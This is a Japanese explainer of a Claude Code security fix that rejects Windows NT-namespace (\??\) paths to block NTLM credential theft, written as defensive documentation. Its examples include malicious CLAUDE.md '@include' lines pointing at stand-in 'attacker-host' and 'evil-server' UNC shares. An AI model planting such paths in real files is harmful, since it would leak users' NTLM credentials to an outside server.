## 原文（日本語訳）

セキュリティ強化: リモートファイル読み取り、セッション復元、CLAUDE.mdのinclude、workflowスクリプト、ファイルアップロードが、Windowsの NT名前空間パス（`\??\`）を拒否するようになりました。これにより、残っていた事前承認済みファイルアクセス経路がNTLM資格情報漏洩ベクターに対して強化されました。

## 原文（英語）

Security: remote file reads, session restore, CLAUDE.md includes, workflow scripts and file uploads now reject Windows NT-namespace (`\??\`) paths, hardening the remaining pre-approval file accesses against the NTLM credential-leak vector

## 概要

Windows環境では `\??\` から始まるNT名前空間パス（NTオブジェクトマネージャの名前空間を直接参照する特殊なパス形式）を使うことで、通常のファイルパス検証をすり抜けたり、UNCパス経由でリモートのSMBサーバーへ意図せずアクセスさせ、NTLM認証情報を漏洩させる攻撃（いわゆるNTLMリレー/資格情報窃取）に悪用される可能性があります。今回の修正では、リモートファイル読み取り・セッション復元・CLAUDE.mdの `@include` 展開・workflowスクリプト実行・ファイルアップロードといった、ユーザーの事前承認なしに実行され得る残りのファイルアクセス経路すべてで、この種のNT名前空間パスを検出して拒否するようになりました。

## 基本的な使い方

ユーザー側で特別な操作は不要です。Claude Codeが内部でファイルパスを扱う際、`\??\` で始まるパスが検出されると自動的に拒否されるようになりました。

```
# 悪意のあるパスを含むファイルや入力が渡された場合
CLAUDE.md:
@include \??\UNC\attacker-host\share\malicious.md

# 修正後: このパスはNT名前空間パスとして検出され、読み込みが拒否される
```

## 実践例

### CLAUDE.mdのinclude機能を悪用する攻撃の防止

外部から取り込んだリポジトリやプロンプトインジェクションによって、CLAUDE.md内に不正な `@include` パスが混入した場合でも、NT名前空間パスは読み込まれなくなります。

```
CLAUDE.md:
@include \??\C:\Windows\System32\drivers\etc\hosts
@include \??\UNC\evil-server\share\payload

# これらのパスはすべて拒否され、意図しないファイルアクセスやリモート接続は発生しない
```

### セッション復元時の不正なパス混入対策

保存されたセッション状態に細工されたファイルパスが含まれていた場合でも、復元処理時にNT名前空間パスとして検出・拒否されます。

### workflowスクリプトやファイルアップロード経由の攻撃防止

CI/CDやカスタムworkflow内でファイルパスを動的に組み立てる処理があっても、`\??\` 形式のパスはworkflowスクリプト実行やファイルアップロードの段階で弾かれます。

## 注意点

- この修正はWindows環境における `\??\` 形式のNT名前空間パスを対象としています
- 通常の正当な絶対パス（`C:\Users\...` など）や標準的なUNCパス（`\\server\share`）の利用には影響しません
- 攻撃シナリオの背景にあるのは、NT名前空間パス経由で外部SMBサーバーへの接続を発生させ、Windowsが自動的に送信するNTLM認証情報を攻撃者側で窃取する手法です
- 今回の対策はリモートファイル読み取り・セッション復元・CLAUDE.mdのinclude・workflowスクリプト・ファイルアップロードという、事前承認なしに実行され得る経路に対するものであり、防御多層化の一環です
